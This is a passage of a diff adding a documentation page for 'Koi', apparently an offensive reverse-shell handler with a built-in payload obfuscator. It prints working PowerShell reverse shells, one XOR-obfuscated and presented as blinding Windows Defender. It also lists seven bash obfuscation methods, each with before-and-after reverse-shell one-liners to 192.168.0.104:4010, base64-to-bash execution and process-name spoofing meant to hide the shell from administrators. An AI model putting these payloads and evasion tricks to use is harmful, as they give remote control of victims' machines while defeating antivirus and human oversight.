+    <span class="nv">$sendback2</span> <span class="p">=</span> <span class="nv">$sendback</span> <span class="p">+</span> <span class="p">(</span><span class="s1">&#39;{0}{1}&#39;</span> <span class="o">-f</span> <span class="s1">&#39;P&#39;</span><span class="p">,</span> <span class="s1">&#39;S &#39;</span><span class="p">)</span> <span class="p">+</span> <span class="p">(&amp;(</span><span class="s2">&quot;pw&quot;</span> <span class="p">+</span> <span class="s2">&quot;d&quot;</span><span class="p">)).</span><span class="n">Path</span> <span class="p">+</span> <span class="p">(</span><span class="s1">&#39;{0}{1}&#39;</span> <span class="o">-f</span> <span class="s1">&#39;&gt;&#39;</span><span class="p">,</span> <span class="s1">&#39; &#39;</span><span class="p">)</span>
+    <span class="nv">$sendbyte</span> <span class="p">=</span> <span class="p">(</span><span class="no">[text.encoding]</span><span class="p">::</span><span class="n">ASCII</span><span class="p">).</span><span class="n">GetBytes</span><span class="p">(</span><span class="nv">$sendback2</span><span class="p">)</span>
+    <span class="nv">$stream</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="nv">$sendbyte</span><span class="p">,</span> <span class="n">0</span><span class="p">,</span> <span class="nv">$sendbyte</span><span class="p">.</span><span class="n">Length</span><span class="p">)</span>
+    <span class="nv">$stream</span><span class="p">.</span><span class="n">Flush</span><span class="p">()</span>
+<span class="p">}</span>
+
+<span class="nv">$client</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>
+</code></pre></div></p>
+<p>And now, defender gets blind !</p>
+<p><img alt="yayyyy" src="../assets/images/powershell_passed.png" /></p>
+<p>On our end, Koi detects the shell and handles it like a charm.</p>
+<p><img alt="very yayyyy" src="../assets/images/obfuscated_powershell_poc.png" /></p>
+<p>the <code>xor</code> method is also interesting but less enjoyable to read and understand:</p>
+<div class="highlight"><pre><span></span><code><span class="nv">$client</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">Sockets</span><span class="p">.</span><span class="n">TCPClient</span><span class="p">(</span>
+    <span class="p">(</span>
+        <span class="p">$(</span><span class="nv">$k9674</span><span class="p">=</span><span class="n">49</span><span class="p">;</span><span class="nv">$b</span><span class="p">=</span><span class="no">[byte[]]</span><span class="p">(</span><span class="n">0x4a</span><span class="p">,</span><span class="n">0x01</span><span class="p">,</span><span class="n">0x4c</span><span class="p">,</span><span class="n">0x4a</span><span class="p">,</span><span class="n">0x00</span><span class="p">,</span><span class="n">0x4c</span><span class="p">,</span><span class="n">0x4a</span><span class="p">,</span><span class="n">0x03</span><span class="p">,</span><span class="n">0x4c</span><span class="p">);</span><span class="n">-join</span><span class="p">(</span><span class="nv">$b</span><span class="p">|%{</span><span class="no">[char]</span><span class="p">(</span><span class="nv">$_</span><span class="o">-bxor</span><span class="nv">$k9674</span><span class="p">)}))</span> <span class="o">-f</span> 
+        <span class="p">$(</span><span class="nv">$k2450</span><span class="p">=</span><span class="n">24</span><span class="p">;</span><span class="nv">$b</span><span class="p">=</span><span class="no">[byte[]]</span><span class="p">(</span><span class="n">0x29</span><span class="p">,</span><span class="n">0x2f</span><span class="p">,</span><span class="n">0x2a</span><span class="p">,</span><span class="n">0x36</span><span class="p">);</span><span class="n">-join</span><span class="p">(</span><span class="nv">$b</span><span class="p">|%{</span><span class="no">[char]</span><span class="p">(</span><span class="nv">$_</span><span class="o">-bxor</span><span class="nv">$k2450</span><span class="p">)})),</span>
+        <span class="s1">&#39;1&#39;</span><span class="p">,</span>
+        <span class="p">$(</span><span class="nv">$k9391</span><span class="p">=</span><span class="n">217</span><span class="p">;</span><span class="nv">$b</span><span class="p">=</span><span class="no">[byte[]]</span><span class="p">(</span><span class="n">0xee</span><span class="p">,</span><span class="n">0xf7</span><span class="p">,</span><span class="n">0xe9</span><span class="p">,</span><span class="n">0xf7</span><span class="p">,</span><span class="n">0xe8</span><span class="p">);</span><span class="n">-join</span><span class="p">(</span><span class="nv">$b</span><span class="p">|%{</span><span class="no">[char]</span><span class="p">(</span><span class="nv">$_</span><span class="o">-bxor</span><span class="nv">$k9391</span><span class="p">)}))</span>
+    <span class="p">),</span> 
+    <span class="n">4010</span>
+<span class="p">)</span>
+<span class="nv">$stream</span> <span class="p">=</span> <span class="nv">$client</span><span class="p">.</span><span class="n">GetStream</span><span class="p">()</span>
+<span class="no">[byte[]]</span><span class="nv">$bytes</span> <span class="p">=</span> <span class="n">0</span><span class="p">..</span><span class="n">65535</span> <span class="p">|</span> <span class="p">%{</span> <span class="n">0</span> <span class="p">}</span>
+
+<span class="k">while</span> <span class="p">((</span><span class="nv">$i</span> <span class="p">=</span> <span class="nv">$stream</span><span class="p">.</span><span class="n">Read</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span> <span class="n">0</span><span class="p">,</span> <span class="nv">$bytes</span><span class="p">.</span><span class="n">Length</span><span class="p">))</span> <span class="o">-ne</span> <span class="n">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$data</span> <span class="p">=</span> <span class="p">(</span><span class="nb">New-Object</span> <span class="n">Text</span><span class="p">.</span><span class="n">ASCIIEncoding</span><span class="p">).</span><span class="n">GetString</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span> <span class="n">0</span><span class="p">,</span> <span class="nv">$i</span><span class="p">)</span>
+    <span class="nv">$sendback</span> <span class="p">=</span> <span class="p">(</span><span class="nb">iex </span><span class="nv">$data</span> <span class="n">2</span><span class="p">&gt;&amp;</span><span class="n">1</span> <span class="p">|</span> <span class="nb">Out-String</span><span class="p">)</span>
+
+    <span class="nv">$sendback2</span> <span class="p">=</span> <span class="nv">$sendback</span> <span class="p">+</span> <span class="p">(</span>
+        <span class="p">$(</span><span class="nv">$k2822</span><span class="p">=</span><span class="n">147</span><span class="p">;</span><span class="nv">$b</span><span class="p">=</span><span class="no">[byte[]]</span><span class="p">(</span><span class="n">0xe8</span><span class="p">,</span><span class="n">0xa3</span><span class="p">,</span><span class="n">0xee</span><span class="p">,</span><span class="n">0xe8</span><span class="p">,</span><span class="n">0xa2</span><span class="p">,</span><span class="n">0xee</span><span class="p">,</span><span class="n">0xe8</span><span class="p">,</span><span class="n">0xa1</span><span class="p">,</span><span class="n">0xee</span><span class="p">);</span><span class="n">-join</span><span class="p">(</span><span class="nv">$b</span><span class="p">|%{</span><span class="no">[char]</span><span class="p">(</span><span class="nv">$_</span><span class="o">-bxor</span><span class="nv">$k2822</span><span class="p">)}))</span> <span class="o">-f</span> 
+        <span class="s1">&#39;P&#39;</span><span class="p">,</span>
+        <span class="s1">&#39;S&#39;</span><span class="p">,</span>
+        <span class="s1">&#39; $($k5278=129;$b=[byte[]](0xa8,0xaa,0xa9,0xf1,0xf6,0xe5,0xa8,0xaf,0xd1,0xe0,0xf5,0xe9,0xaa,0xa9);-join($b|%{[char]($_-bxor$k5278)})){0}{1}$($k3084=142;$b=[byte[]](0xae,0xa3,0xe8,0xae);-join($b|%{[char]($_-bxor$k3084)}))&gt;&#39;</span><span class="p">,</span>
+        <span class="s1">&#39; &#39;</span>
+    <span class="p">)</span>
+
+    <span class="nv">$sendbyte</span> <span class="p">=</span> <span class="p">(</span><span class="no">[text.encoding]</span><span class="p">::</span><span class="n">ASCII</span><span class="p">).</span><span class="n">GetBytes</span><span class="p">(</span><span class="nv">$sendback2</span><span class="p">)</span>
+    <span class="nv">$stream</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="nv">$sendbyte</span><span class="p">,</span> <span class="n">0</span><span class="p">,</span> <span class="nv">$sendbyte</span><span class="p">.</span><span class="n">Length</span><span class="p">)</span>
+    <span class="nv">$stream</span><span class="p">.</span><span class="n">Flush</span><span class="p">()</span>
+<span class="p">}</span>
+
+<span class="nv">$client</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>
+</code></pre></div>
+<p>That's pretty much all you need to know for windows.</p>
+<h3 id="for-linux">For Linux</h3>
+<p>The obfuscator for linux, is likely less useful for most usecases. But I wanted to implement it for personal researches and also because <strong>IT MIGHT</strong> be useful of a 1% of the users. </p>
+<p><img alt="windows menu" src="../assets/images/windows_obfuscator.png" /></p>
+<p>Like for Windows, let's explain what we have here.</p>
+<hr />
+<h4 id="1-ansi-c-quoting-ansi_c">1. ANSI-C Quoting (<code>ansi_c</code>)</h4>
+<p>This method targets critical keywords (such as <code>bash</code> or <code>/dev/tcp</code>) and replaces them with their ANSI-C escaped hexadecimal representation.</p>
+<ul>
+<li><strong>How it works:</strong> Bash natively supports executing strings translated via the <code>$'\xNN'</code> syntax. Security solutions looking for plain text tokens fail to match the signature.</li>
+<li><strong>Before:</strong>
+    <div class="highlight"><pre><span></span><code>bash<span class="w"> </span>-i<span class="w"> </span>&gt;<span class="p">&amp;</span><span class="w"> </span>/dev/tcp/192.168.0.104/4010<span class="w"> </span><span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
+</code></pre></div></li>
+<li><strong>After:</strong>
+    <div class="highlight"><pre><span></span><code><span class="s1">$&#39;\x62\x61\x73\x68&#39;</span><span class="w"> </span>-i<span class="w"> </span>&gt;<span class="p">&amp;</span><span class="w"> </span><span class="s1">$&#39;\x2f\x64\x65\x76\x2f\x74\x63\x70&#39;</span>/192.168.0.104/4010<span class="w"> </span><span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
+</code></pre></div></li>
+</ul>
+<h4 id="2-printf-hex-encoding-printf_hex">2. Printf Hex Encoding (<code>printf_hex</code>)</h4>
+<p>Similar to ANSI-C quoting, this technique alters standard text strings into non-human-readable hexadecimal representations.</p>
+<ul>
+<li><strong>How it works:</strong> It replaces static tokens with a nested command substitution block <code>$(printf '\xNN...')</code>. At execution time, the shell evaluates <code>printf</code>, reconstructs the plain text token dynamically in memory, and triggers the command.</li>
+<li><strong>Before:</strong>
+    <div class="highlight"><pre><span></span><code>bash<span class="w"> </span>-i
+</code></pre></div></li>
+<li><strong>After:</strong>
+    <div class="highlight"><pre><span></span><code><span class="k">$(</span><span class="nb">printf</span><span class="w"> </span><span class="s1">&#39;\x62\x61\x73\x68&#39;</span><span class="k">)</span><span class="w"> </span>-i
+</code></pre></div></li>
+</ul>
+<h4 id="3-empty-quote-injection-quote_insert">3. Empty Quote Injection (<code>quote_insert</code>)</h4>
+<p>A lightweight yet highly effective trick against legacy or pattern-matching static detection mechanisms.</p>
+<ul>
+<li><strong>How it works:</strong> The engine randomly selects a point within key strings and injects empty single (<code>''</code>) or double (<code>""</code>) quotes. Humans and Linux interpreters resolve <code>ba''sh</code> perfectly as <code>bash</code>, but simple signature filters get completely thrown off.</li>
+<li><strong>Before:</strong>
+    <div class="highlight"><pre><span></span><code>/dev/tcp/192.168.0.104/4010
+</code></pre></div></li>
+<li><strong>After (Randomly generated):</strong>
+    <div class="highlight"><pre><span></span><code>/dev/t<span class="s1">&#39;&#39;</span>cp/192.168.0.104/4010
+</code></pre></div></li>
+</ul>
+<h4 id="4-variable-token-splitting-var_split">4. Variable Token Splitting (<code>var_split</code>)</h4>
+<p>This technique chops vital structural terms into bits and scatters them into random shell variables before assembling them.</p>
+<ul>
+<li><strong>How it works:</strong> Koi instantiates short, randomized environment variables (e.g., <code>_a</code>, <code>_b</code>), assigns fractions of the strings to them, and pieces them together sequentially via parameter expansion variables <code>${_a}${_b}</code>.</li>
+<li><strong>Before:</strong>
+    <div class="highlight"><pre><span></span><code>bash<span class="w"> </span>-i
+</code></pre></div></li>
+<li><strong>After (Randomly generated):</strong>
+    <div class="highlight"><pre><span></span><code><span class="nv">_xa</span><span class="o">=</span>bas<span class="p">;</span><span class="nv">_mv</span><span class="o">=</span>h<span class="p">;</span><span class="si">${</span><span class="nv">_xa</span><span class="si">}${</span><span class="nv">_mv</span><span class="si">}</span><span class="w"> </span>-i
+</code></pre></div></li>
+</ul>
+<h4 id="5-base64-full-encoding-base64">5. Base64 Full Encoding (<code>base64</code>)</h4>
+<p>Instead of editing tiny fragments of the command, this wraps and sanitizes your entire reverse shell line.</p>
+<ul>
+<li><strong>How it works:</strong> The whole payload gets encoded into a clean Base64 string block. It is then fed into a Bash decoder pipe using here-strings (<code>&lt;&lt;&lt;</code>), executing entirely in-memory without dropping clean artifacts.</li>
+<li><strong>Before:</strong>
+    <div class="highlight"><pre><span></span><code>bash<span class="w"> </span>-i<span class="w"> </span>&gt;<span class="p">&amp;</span><span class="w"> </span>/dev/tcp/192.168.0.104/4010<span class="w"> </span><span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
+</code></pre></div></li>
+<li><strong>After:</strong>
+    <div class="highlight"><pre><span></span><code>bash<span class="o">&lt;&lt;&lt;</span><span class="k">$(</span>base64<span class="w"> </span>-d<span class="o">&lt;&lt;&lt;</span>YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMTA0LzQwMTAgMD4mMQ<span class="o">==</span><span class="k">)</span>
+</code></pre></div></li>
+</ul>
+<h4 id="6-environment-storage-eval-ifs">6. Environment Storage Eval (<code>ifs</code>)</h4>
+<p>This method abstracts execution by containing the logic away inside variables, breaking logical flow analysis.</p>
+<ul>
+<li><strong>How it works:</strong> Your payload is declared inside a temporary variable using <code>export</code>. Immediately following, the <code>eval</code> command interprets the variable content directly.</li>
+<li><strong>Before:</strong>
+    <div class="highlight"><pre><span></span><code>bash<span class="w"> </span>-i
+</code></pre></div></li>
+<li><strong>After (Randomly generated):</strong>
+    <div class="highlight"><pre><span></span><code><span class="nb">export</span><span class="w"> </span><span class="nv">_zqd</span><span class="o">=</span><span class="s1">&#39;bash -i&#39;</span><span class="p">;</span><span class="nb">eval</span><span class="w"> </span><span class="nv">$_zqd</span>
+</code></pre></div></li>
+</ul>
+<h4 id="7-argument-vector-spoofing-spoof_argv">7. Argument Vector Spoofing (<code>spoof_argv</code>)</h4>
+<p>An advanced defense evasion tactic focused on hiding your connection from system logs, monitoring scripts, <code>ps</code>, or <code>top</code>.</p>
+<ul>
+<li><strong>How it works:</strong> It uses the Bash built-in <code>exec -a</code> flag. This switch allows Koi to define a custom name for the process placeholder in the process tree. The script encodes the payload and assigns it a harmless kernel process name disguise (like <code>[kworker/0:1]</code> or <code>[migration/0]</code>). Any administrator checking current running tasks will see a legitimate kernel worker instead of a malicious shell.</li>
+<li><strong>Before:</strong>
+    <div class="highlight"><pre><span></span><code>bash<span class="w"> </span>-i<span class="w"> </span>&gt;<span class="p">&amp;</span><span class="w"> </span>/dev/tcp/192.168.0.104/4010<span class="w"> </span><span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
+</code></pre></div></li>
+<li><strong>After:</strong>
+    <div class="highlight"><pre><span></span><code><span class="nb">exec</span><span class="w"> </span>-a<span class="w"> </span><span class="s1">&#39;[kworker/1:2]&#39;</span><span class="w"> </span>bash<span class="w"> </span>&lt;<span class="o">(</span><span class="nb">echo</span><span class="w"> </span>YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMTA0LzQwMTAgMD4mMQ<span class="o">==</span><span class="p">|</span>base64<span class="w"> </span>-d<span class="o">)</span>
+</code></pre></div></li>
+</ul>
+<h2 id="last-words">Last words</h2>
+<div class="admonition warning">
+<p class="admonition-title">Payloads can break</p>
+<p>Obfuscation comes with a limit. the way Koi works is by sending probes to it's shell, waiting for a signature response, so it can determine if he's dealing with Windows or Linux.</p>
+<p>If your payload is obfuscated too much, the probe might not recognize the OS, in the best scenario.</p>
+<p>In the worst scenario, you might completely break the code and make the payload unreadable at all.</p>
+<p>So experiment as you wish, but keep that in mind</p>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "..", "features": ["content.code.copy"], "search": "../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  </body>
+</html>
